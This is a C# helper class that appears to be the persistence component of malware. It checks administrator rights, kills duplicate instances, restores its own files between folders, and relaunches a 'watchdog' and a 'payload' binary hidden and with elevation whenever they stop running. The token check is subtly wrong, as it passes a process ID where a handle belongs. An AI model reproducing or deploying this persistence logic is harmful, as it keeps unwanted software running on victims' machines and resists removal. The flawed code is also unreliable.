using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

public static class watchdogHelper
{
    #region Logging

    public static void Log(string message)
    {
        if (Config.Debugging)
            Console.WriteLine($"[Watchdog] {message}");
    }

    #endregion

    #region Process & Mutex Checks

    private static bool IsMutexRunning(string mutexName)
    {
        try
        {
            using var mutex = new Mutex(false, "Global\\" + mutexName, out bool isNewInstance);
            return !isNewInstance;
        }
        catch (Exception ex)
        {
            Log($"Error verifying mutex: {ex.Message}");
            return false;
        }
    }

    private static bool IsProcessRunning(string processName)
    {
        try
        {
            string name = Path.GetFileNameWithoutExtension(processName);
            return Process.GetProcessesByName(name).Length > 0;
        }
        catch (Exception ex)
        {
            Log($"Error checking process '{processName}': {ex.Message}");
            return false;
        }
    }

    public static bool KillProcessById(int pid)
    {
        try
        {
            var process = Process.GetProcessById(pid);
            process.Kill(true);
            process.WaitForExit();
            process.Dispose();
            return true;
        }
        catch (ArgumentException)
        {
            Log($"No process with PID {pid} exists.");
        }
        catch (Exception ex)
        {
            Log($"Failed to kill process {pid}: {ex.Message}");
        }
        return false;
    }

    #endregion

    #region Privilege Checks

    public static void EnsureHighestPriv(bool isNewInstance)
    {
        if (isNewInstance) return; // nothing to do if this is the new instance

        if (!IsElevated())
        {
            Environment.Exit(0);
        }

        // Kill duplicate processes, keep only the current one
        string currentName = Process.GetCurrentProcess().ProcessName;
        int currentId = Process.GetCurrentProcess().Id;
        var duplicates = Process.GetProcessesByName(currentName).Where(p => p.Id != currentId).ToList();

        foreach (var p in duplicates)
        {
            if (IsPIDElevated(p.Id)) Environment.Exit(0);
            KillProcessById(p.Id);
        }

        Log("Ensured highest privileges and single instance.");
    }

    public static bool IsElevated()
    {
        var identity = WindowsIdentity.GetCurrent();
        var principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator) || principal.IsInRole(WindowsBuiltInRole.SystemOperator);
    }

    private static bool IsPIDElevated(int pid)
    {
        IntPtr tokenHandle = IntPtr.Zero;
        try
        {
            if (!OpenProcessToken((IntPtr)pid, TOKEN_QUERY, out tokenHandle)) return false;

            var elevation = new TOKEN_ELEVATION();
            int size = Marshal.SizeOf<TOKEN_ELEVATION>();
            IntPtr ptr = Marshal.AllocHGlobal(size);

            try
            {
                if (GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenElevation, ptr, size, out _))
                {
                    elevation = Marshal.PtrToStructure<TOKEN_ELEVATION>(ptr);
                    return elevation.TokenIsElevated != 0;
                }
                return false;
            }
            finally
            {
                Marshal.FreeHGlobal(ptr);
            }
        }
        finally
        {
            if (tokenHandle != IntPtr.Zero) CloseHandle(tokenHandle);
        }
    }

    #endregion

    #region File / Directory Helpers

    public static void EnsureDirectoryExists(string dirPath)
    {
        try
        {
            Directory.CreateDirectory(dirPath);
        }
        catch (Exception ex)
        {
            Log($"Failed to create directory '{dirPath}': {ex.Message}");
        }
    }

    public static void VerifyFilePathsSourceAndDest(string destinationPath, string filename)
    {
        try
        {
            string cwd = Directory.GetCurrentDirectory();
            string src = Path.Combine(cwd, filename);
            string dest = Path.Combine(destinationPath, filename);

            EnsureDirectoryExists(destinationPath);

            if (File.Exists(dest) || File.Exists(src))
            {
                if (!File.Exists(dest) && File.Exists(src))
                    File.Copy(src, dest, overwrite: false);
                else if (!File.Exists(src) && File.Exists(dest))
                    File.Copy(dest, src, overwrite: false);
            }
            else
            {
                Log($"File '{filename}' not found in either source or destination.");
            }
        }
        catch (Exception ex)
        {
            Log($"Error verifying file paths for '{filename}': {ex.Message}");
        }
    }

    public static void RunBinary(string filePath, string arguments = "")
    {
        try
        {
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = filePath,
                Arguments = arguments,
                UseShellExecute = true,         // ensures it runs as independent top-level process
                CreateNoWindow = true,          // hides any console window
                WindowStyle = ProcessWindowStyle.Hidden,
                Verb = "runas"                  // request elevation
            };

            Process.Start(startInfo);
        }
        catch (Exception ex)
        {
            Log($"Error Running Binary: {ex.Message}");
        }
    }

    public static void CheckAndRunWatchdog(string watchdogPath, string watchdogName, string mutex)
    {
        if (!IsMutexRunning(mutex))
            RunBinary(Path.Combine(watchdogPath, watchdogName));
    }

    public static void CheckAndRunPayload(string payloadPath, string payloadName)
    {
        if (!IsProcessRunning(payloadName))
            RunBinary(Path.Combine(payloadPath, payloadName));
    }

    #endregion

    #region WinAPI

    private const int TOKEN_QUERY = 0x0008;

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool OpenProcessToken(IntPtr processHandle, int desiredAccess, out IntPtr tokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool GetTokenInformation(IntPtr tokenHandle, TOKEN_INFORMATION_CLASS tokenInfoClass,
        IntPtr tokenInfo, int tokenInfoLength, out int returnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    private enum TOKEN_INFORMATION_CLASS { TokenElevation = 20 }

    [StructLayout(LayoutKind.Sequential)]
    private struct TOKEN_ELEVATION { public int TokenIsElevated; }

    #endregion
}
